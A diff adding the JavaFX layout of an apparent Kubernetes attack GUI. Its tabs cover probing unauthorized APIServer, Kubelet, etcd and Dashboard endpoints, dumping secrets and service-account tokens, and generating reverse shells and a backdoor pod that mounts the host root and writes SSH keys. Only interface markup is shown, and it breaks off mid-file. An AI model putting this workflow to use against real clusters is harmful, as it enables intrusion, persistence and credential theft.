@@ -1,0 +1,1003 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<?import javafx.geometry.*?>
+<?import javafx.scene.control.*?>
+<?import javafx.scene.layout.*?>
+
+<BorderPane prefHeight="860.0" prefWidth="1200.0" styleClass="app-shell" xmlns="http://javafx.com/javafx/17" xmlns:fx="http://javafx.com/fxml/1" fx:controller="com.k8spen.tool.controller.MainController">
+    <top>
+        <VBox spacing="6.0">
+            <children>
+                <MenuBar>
+                    <menus>
+                        <Menu mnemonicParsing="false" text="Settings">
+                            <items>
+                                <MenuItem mnemonicParsing="false" text="Clear Log" onAction="#clearLog" />
+                            </items>
+                        </Menu>
+                        <Menu mnemonicParsing="false" text="About">
+                            <items>
+                                <MenuItem mnemonicParsing="false" text="About K8S-mythos-tool" onAction="#showAbout" />
+                            </items>
+                        </Menu>
+                    </menus>
+                </MenuBar>
+                <TitledPane text="Target Configuration" expanded="true" styleClass="target-bar">
+                    <content>
+                        <HBox spacing="10.0" alignment="CENTER_LEFT">
+                            <children>
+                                <Label text="Target Host" />
+                                <TextField fx:id="targetHost" prefWidth="300.0" promptText="192.168.1.100" />
+                                <Label text="Timeout (s)" />
+                                <TextField fx:id="timeoutField" prefWidth="60.0" text="5" />
+                                <CheckBox fx:id="sslSkipVerify" text="Skip TLS Verification" selected="true" />
+                                <Label text="Token" />
+                                <TextField fx:id="tokenField" prefWidth="300.0" promptText="Bearer Token" HBox.hgrow="ALWAYS" />
+                                <Button text="Decode Base64 Token" onAction="#decodeTokenBase64" />
+                            </children>
+                        </HBox>
+                    </content>
+                </TitledPane>
+            </children>
+            <padding>
+                <Insets bottom="4.0" left="6.0" right="6.0" top="6.0" />
+            </padding>
+        </VBox>
+    </top>
+    <center>
+        <TabPane fx:id="mainTabPane" tabClosingPolicy="UNAVAILABLE">
+            <tabs>
+                <Tab text="&#x4fe1;&#x606f;&#x6536;&#x96c6;">
+                    <content>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT">
+                            <tabs>
+                                <Tab text="&#x73af;&#x5883;&#x8fa8;&#x522b;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x5224;&#x65ad;&#x5f53;&#x524d;&#x662f;&#x5426;&#x5728;K8s/Docker&#x5bb9;&#x5668;&#x73af;&#x5883;&#x4e2d;&#x7684;&#x5e38;&#x7528;&#x547d;&#x4ee4;:" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="envCheckCmds" editable="false" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;&#x547d;&#x4ee4;" onAction="#copyEnvCmds" prefWidth="120.0" />
+                                                        <Button text="&#x4f7f;&#x7528;&#x8bf4;&#x660e;" onAction="#showEnvGuidance" prefWidth="120.0" />
+                                                    </children>
+                                                </HBox>
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x7279;&#x6743;&#x641c;&#x96c6;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x5bb9;&#x5668;&#x7279;&#x6743;/Capabilities&#x4fe1;&#x606f;&#x641c;&#x96c6;&#x547d;&#x4ee4;:" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="privCheckCmds" editable="false" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;&#x547d;&#x4ee4;" onAction="#copyPrivCmds" prefWidth="120.0" />
+                                                        <Label text="CapEff Hex" />
+                                                        <TextField fx:id="capHexInput" prefWidth="300.0" promptText="00000000a80425fb" />
+                                                        <Button text="&#x89e3;&#x7801;Capabilities" onAction="#decodeCapabilities" prefWidth="140.0" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="capDecodeOutput" prefRowCount="5" wrapText="true" editable="false" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x7aef;&#x53e3;&#x53c2;&#x8003;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="K8s&#x76f8;&#x5173;&#x5e38;&#x89c1;&#x7aef;&#x53e3;&#x5217;&#x8868;:" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="portRefArea" editable="false" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x5feb;&#x901f;&#x7aef;&#x53e3;&#x626b;&#x63cf;" onAction="#quickPortScan" prefWidth="140.0" />
+                                                        <Label text="&#x626b;&#x63cf;&#x76ee;&#x6807;&#x5730;&#x5740;&#x7684;K8s&#x5e38;&#x89c1;&#x7aef;&#x53e3;" style="-fx-text-fill: gray;" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="portScanResult" prefRowCount="8" wrapText="true" editable="false" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="ServiceAccount">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="Service Account Token&#x76f8;&#x5173;&#x547d;&#x4ee4;(&#x5728;Pod&#x5185;&#x6267;&#x884c;):" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="saTokenCmds" editable="false" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <Button text="&#x590d;&#x5236;&#x547d;&#x4ee4;" onAction="#copySATokenCmds" prefWidth="120.0" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                    </content>
+                </Tab>
+
+                <Tab text="&#x521d;&#x59cb;&#x8bbf;&#x95ee;">
+                    <content>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT">
+                            <tabs>
+                                <Tab text="APIServer&#x672a;&#x6388;&#x6743;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="APIServer&#x672a;&#x6388;&#x6743;&#x68c0;&#x6d4b; (insecure-port 8080 / secure-port 6443)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x68c0;&#x6d4b;8080(&#x975e;&#x5b89;&#x5168;&#x7aef;&#x53e3;)" onAction="#checkInsecurePort" prefWidth="200.0" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x68c0;&#x6d4b;6443(&#x5b89;&#x5168;&#x7aef;&#x53e3;&#x533f;&#x540d;)" onAction="#checkSecurePort" prefWidth="200.0" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x83b7;&#x53d6;Nodes" onAction="#getNodes" />
+                                                        <Button text="&#x83b7;&#x53d6;Pods" onAction="#getPods" />
+                                                        <Button text="&#x83b7;&#x53d6;Secrets" onAction="#getSecrets" />
+                                                        <Button text="&#x68c0;&#x67e5;&#x6743;&#x9650;" onAction="#checkAuth" />
+                                                    </children>
+                                                </HBox>
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="&#x81ea;&#x5b9a;&#x4e49;API&#x8def;&#x5f84;" />
+                                                        <TextField fx:id="customApiPath" prefWidth="400.0" promptText="/api/v1/namespaces/default/secrets" HBox.hgrow="ALWAYS" />
+                                                        <ComboBox fx:id="apiMethodOpt" prefWidth="80.0" />
+                                                        <Button text="&#x53d1;&#x9001;&#x8bf7;&#x6c42;" onAction="#sendCustomApi" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="kubectl&#x7b49;&#x6548;&#x547d;&#x4ee4;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="kubectlCmdHint" prefRowCount="3" editable="false" wrapText="true" style="-fx-font-family: Consolas;" />
+                                                <Label text="&#x54cd;&#x5e94;&#x7ed3;&#x679c;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="apiServerOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="Kubelet&#x672a;&#x6388;&#x6743;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="Kubelet&#x672a;&#x6388;&#x6743;&#x68c0;&#x6d4b; (10250&#x7aef;&#x53e3;)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x68c0;&#x6d4b;10250(kubelet API)" onAction="#checkKubelet" prefWidth="200.0" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x5217;&#x51fa;&#x6240;&#x6709;Pods" onAction="#kubeletListPods" />
+                                                        <Button text="&#x6267;&#x884c;&#x547d;&#x4ee4;" onAction="#kubeletExecCmd" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x4e00;&#x952e;&#x5199;&#x5165;SSH&#x5bc6;&#x94a5;" onAction="#kubeletInjectSSHKey" style="-fx-base: #c0392b; -fx-text-fill: white;" />
+                                                    </children>
+                                                </HBox>
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="kubeletNs" prefWidth="150.0" text="default" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="Pod&#x540d;&#x79f0;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="kubeletPod" prefWidth="200.0" promptText="Pod name" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x5bb9;&#x5668;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="kubeletContainer" prefWidth="150.0" promptText="Container name" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="&#x6267;&#x884c;&#x547d;&#x4ee4;" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="kubeletCmd" prefWidth="500.0" promptText="id" GridPane.columnIndex="1" GridPane.rowIndex="1" GridPane.columnSpan="5" />
+                                                    </children>
+                                                </GridPane>
+                                                <Label text="Kubelet API &#x54cd;&#x5e94;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="kubeletOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="Etcd&#x672a;&#x6388;&#x6743;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="Etcd&#x672a;&#x6388;&#x6743;&#x68c0;&#x6d4b; (2379&#x7aef;&#x53e3;)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x68c0;&#x6d4b;2379(etcd)" onAction="#checkEtcd" prefWidth="180.0" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x83b7;&#x53d6;&#x6240;&#x6709;Keys" onAction="#etcdGetKeys" />
+                                                        <Button text="&#x641c;&#x7d22;Secrets/Token" onAction="#etcdSearchSecrets" style="-fx-base: #e67e22;" />
+                                                    </children>
+                                                </HBox>
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="etcd&#x7248;&#x672c;" />
+                                                        <ComboBox fx:id="etcdVersionOpt" prefWidth="100.0" />
+                                                        <Label text="&#x7aef;&#x53e3;" />
+                                                        <TextField fx:id="etcdPort" prefWidth="70.0" text="2379" />
+                                                        <Label text="&#x81ea;&#x5b9a;&#x4e49;Key" />
+                                                        <TextField fx:id="etcdKeyInput" prefWidth="350.0" promptText="/registry/secrets/default" HBox.hgrow="ALWAYS" />
+                                                        <Button text="&#x8bfb;&#x53d6;Key" onAction="#etcdReadKey" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="etcdctl&#x7b49;&#x6548;&#x547d;&#x4ee4;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="etcdCmdHint" prefRowCount="3" editable="false" wrapText="true" style="-fx-font-family: Consolas;" />
+                                                <Label text="Etcd &#x54cd;&#x5e94;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="etcdOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="Dashboard&#x672a;&#x6388;&#x6743;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="K8s Dashboard&#x672a;&#x6388;&#x6743;&#x68c0;&#x6d4b;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x68c0;&#x6d4b;Dashboard" onAction="#checkDashboard" prefWidth="180.0" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x68c0;&#x6d4b;443/8443" onAction="#checkDashboardHttps" />
+                                                        <Button text="&#x6d4f;&#x89c8;&#x5668;&#x6253;&#x5f00;" onAction="#openDashboardInBrowser" />
+                                                    </children>
+                                                </HBox>
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="Dashboard&#x7aef;&#x53e3;" />
+                                                        <TextField fx:id="dashboardPort" prefWidth="80.0" text="30443" />
+                                                        <CheckBox fx:id="dashboardHttps" text="&#x4f7f;&#x7528;HTTPS" selected="true" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="Dashboard &#x68c0;&#x6d4b;&#x7ed3;&#x679c;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="dashboardOutput" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="Kubeconfig&#x6cc4;&#x9732;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="Kubeconfig&#x6587;&#x4ef6;&#x5229;&#x7528;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x52a0;&#x8f7d;Kubeconfig&#x6587;&#x4ef6;" onAction="#loadKubeconfig" />
+                                                        <Label text="~/.kube/config, /etc/kubernetes/admin.conf" style="-fx-text-fill: gray;" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="Kubeconfig &#x5185;&#x5bb9;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="kubeconfigContent" prefRowCount="12" wrapText="true" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x89e3;&#x6790;&#x5e76;&#x63d0;&#x53d6;&#x4fe1;&#x606f;" onAction="#parseKubeconfig" />
+                                                        <Button text="&#x751f;&#x6210;kubectl&#x547d;&#x4ee4;" onAction="#genKubectlCmd" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="&#x89e3;&#x6790;&#x7ed3;&#x679c;/&#x547d;&#x4ee4;&#x8f93;&#x51fa;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="kubeconfigOutput" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                    </content>
+                </Tab>
+
+                <Tab text="&#x547d;&#x4ee4;&#x6267;&#x884c;">
+                    <content>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT">
+                            <tabs>
+                                <Tab text="APIServer exec">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x901a;&#x8fc7;APIServer(6443)&#x6267;&#x884c;&#x547d;&#x4ee4; - &#x53ef;&#x64cd;&#x4f5c;&#x6240;&#x6709;&#x8282;&#x70b9;Pod" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="&#x8d26;&#x53f7;:" style="-fx-font-weight: bold;" />
+                                                        <TextField fx:id="apiExecUsername" prefWidth="100.0" promptText="&#x53ef;&#x7559;&#x7a7a;" />
+                                                        <Label text="&#x5bc6;&#x7801;:" style="-fx-font-weight: bold;" />
+                                                        <PasswordField fx:id="apiExecPassword" prefWidth="100.0" promptText="&#x53ef;&#x7559;&#x7a7a;" />
+                                                        <Button text="&#x5217;&#x51fa;&#x6240;&#x6709;Pods" onAction="#apiListPods" />
+                                                        <Button text="&#x6267;&#x884c;&#x547d;&#x4ee4;" onAction="#apiExecInPod" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x679a;&#x4e3e;SA Token" onAction="#apiEnumSATokens" style="-fx-base: #8e44ad; -fx-text-fill: white;" />
+                                                    </children>
+                                                </HBox>
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="apiExecNs" prefWidth="150.0" promptText="&#x7559;&#x7a7a;=&#x6240;&#x6709;namespace" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="Pod" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="apiExecPod" prefWidth="200.0" promptText="pod-name" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x5bb9;&#x5668;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="apiExecContainer" prefWidth="150.0" promptText="&#x53ef;&#x7559;&#x7a7a;" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="&#x547d;&#x4ee4;" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="apiExecCmd" prefWidth="500.0" text="id" GridPane.columnIndex="1" GridPane.rowIndex="1" GridPane.columnSpan="5" />
+                                                    </children>
+                                                </GridPane>
+                                                <Label text="Pod&#x5217;&#x8868; (&#x70b9;&#x51fb;&#x884c;&#x81ea;&#x52a8;&#x586b;&#x5145;):" style="-fx-font-weight: bold;" />
+                                                <TableView fx:id="apiPodTable" prefHeight="200.0" VBox.vgrow="SOMETIMES" style="-fx-font-size: 12;">
+                                                    <columns>
+                                                        <TableColumn fx:id="colNs" text="Namespace" prefWidth="100.0" />
+                                                        <TableColumn fx:id="colName" text="Pod" prefWidth="200.0" />
+                                                        <TableColumn fx:id="colStatus" text="&#x72b6;&#x6001;" prefWidth="80.0" />
+                                                        <TableColumn fx:id="colNode" text="&#x8282;&#x70b9;" prefWidth="100.0" />
+                                                        <TableColumn fx:id="colIP" text="PodIP" prefWidth="120.0" />
+                                                        <TableColumn fx:id="colContainers" text="&#x5bb9;&#x5668;" prefWidth="150.0" />
+                                                    </columns>
+                                                </TableView>
+                                                <Label text="&#x6267;&#x884c;&#x7ed3;&#x679c;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="apiExecOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="Kubelet exec">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x901a;&#x8fc7;Kubelet(10250)&#x6267;&#x884c;&#x547d;&#x4ee4; - &#x4ec5;&#x672c;&#x8282;&#x70b9;Pod" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x5217;&#x51fa;Pods" onAction="#listPodsForExec" />
+                                                        <Button text="&#x6267;&#x884c;&#x547d;&#x4ee4;" onAction="#execInPod" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x679a;&#x4e3e;SA Token" onAction="#enumSATokensViaExec" style="-fx-base: #8e44ad; -fx-text-fill: white;" />
+                                                        <Button text="&#x751f;&#x6210;&#x53cd;&#x5f39;Shell&#x547d;&#x4ee4;" onAction="#execRevShellInPod" style="-fx-base: #e74c3c;" />
+                                                    </children>
+                                                </HBox>
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="execNamespace" prefWidth="150.0" text="default" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="Pod" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="execPodName" prefWidth="200.0" promptText="pod-name" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x5bb9;&#x5668;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="execContainerName" prefWidth="150.0" promptText="container" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="&#x547d;&#x4ee4;" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="execCommand" prefWidth="500.0" promptText="id" GridPane.columnIndex="1" GridPane.rowIndex="1" GridPane.columnSpan="5" />
+                                                    </children>
+                                                </GridPane>
+                                                <Label text="Pod&#x5217;&#x8868; (&#x70b9;&#x51fb;&#x884c;&#x81ea;&#x52a8;&#x586b;&#x5145;):" style="-fx-font-weight: bold;" />
+                                                <TableView fx:id="kubeletPodTable" prefHeight="180.0" VBox.vgrow="SOMETIMES" style="-fx-font-size: 12;">
+                                                    <columns>
+                                                        <TableColumn fx:id="kColNs" text="Namespace" prefWidth="100.0" />
+                                                        <TableColumn fx:id="kColName" text="Pod" prefWidth="200.0" />
+                                                        <TableColumn fx:id="kColStatus" text="&#x72b6;&#x6001;" prefWidth="80.0" />
+                                                        <TableColumn fx:id="kColNode" text="&#x8282;&#x70b9;" prefWidth="100.0" />
+                                                        <TableColumn fx:id="kColIP" text="PodIP" prefWidth="120.0" />
+                                                        <TableColumn fx:id="kColContainers" text="&#x5bb9;&#x5668;" prefWidth="150.0" />
+                                                    </columns>
+                                                </TableView>
+                                                <Label text="&#x6267;&#x884c;&#x7ed3;&#x679c;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="execOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x521b;&#x5efa;&#x540e;&#x95e8;Pod">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x751f;&#x6210;&#x540e;&#x95e8;Pod YAML (&#x6302;&#x8f7d;&#x5bbf;&#x4e3b;&#x673a;&#x6839;&#x76ee;&#x5f55;+&#x53cd;&#x5f39;Shell)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="&#x955c;&#x50cf;" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="backdoorImage" prefWidth="200.0" text="ubuntu:latest" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="&#x6302;&#x8f7d;&#x8def;&#x5f84;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="backdoorMountPath" prefWidth="120.0" text="/mnt" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x76ee;&#x6807;Node" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="backdoorNodeName" prefWidth="180.0" promptText="&#x53ef;&#x9009;,&#x6307;&#x5b9a;&#x8282;&#x70b9;" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="LHOST" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="backdoorLhost" prefWidth="200.0" promptText="&#x53cd;&#x5f39;&#x5730;&#x5740;" GridPane.columnIndex="1" GridPane.rowIndex="1" />
+                                                        <Label text="LPORT" GridPane.columnIndex="2" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="backdoorLport" prefWidth="120.0" text="4444" GridPane.columnIndex="3" GridPane.rowIndex="1" />
+                                                        <Label text="Pod&#x540d;" GridPane.columnIndex="4" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="backdoorPodName" prefWidth="180.0" text="backdoor-pod" GridPane.columnIndex="5" GridPane.rowIndex="1" />
+                                                    </children>
+                                                </GridPane>
+                                                <Label text="SSH&#x516c;&#x94a5; (&#x7528;&#x4e8e;&#x8ffd;&#x52a0;&#x5230;&#x5bbf;&#x4e3b;&#x673a;authorized_keys):" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="sshPubKeyInput" prefRowCount="3" wrapText="true" promptText="ssh-rsa AAAA... user@host" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;YAML" onAction="#generateBackdoorYaml" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x590d;&#x5236;YAML" onAction="#copyBackdoorYaml" />
+                                                        <Button text="&#x751f;&#x6210;kubectl&#x547d;&#x4ee4;" onAction="#generateBackdoorCmd" />
+                                                        <Button text="&#x751f;&#x6210;SSH&#x767b;&#x5f55;&#x547d;&#x4ee4;" onAction="#generateSshCmd" style="-fx-base: #27ae60;" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="&#x751f;&#x6210;&#x7684;YAML:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="backdoorYamlOutput" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x670d;&#x52a1;&#x8d26;&#x53f7;&#x5229;&#x7528;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x5229;&#x7528;ServiceAccount Token&#x63a7;&#x5236;APIServer" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="saUtilCmds" editable="false" wrapText="true" prefRowCount="10" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;&#x547d;&#x4ee4;" onAction="#copySaUtilCmds2" />
+                                                        <Label text="Token:" />
+                                                        <TextField fx:id="saTokenInput" prefWidth="400.0" promptText="&#x7c98;&#x8d34;SA Token" HBox.hgrow="ALWAYS" />
+                                                        <Button text="&#x68c0;&#x67e5;&#x6743;&#x9650;" onAction="#checkSaPermissions" style="-fx-base: #e67e22;" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="&#x6743;&#x9650;&#x68c0;&#x67e5;&#x7ed3;&#x679c;:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="saCheckOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="RBAC&#x68c0;&#x6d4b;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="RBAC&#x6743;&#x9650;&#x68c0;&#x6d4b;&#x4e0e;&#x5229;&#x7528;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="rbacCheckCmds" editable="false" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;&#x547d;&#x4ee4;" onAction="#copyRbacCmds" />
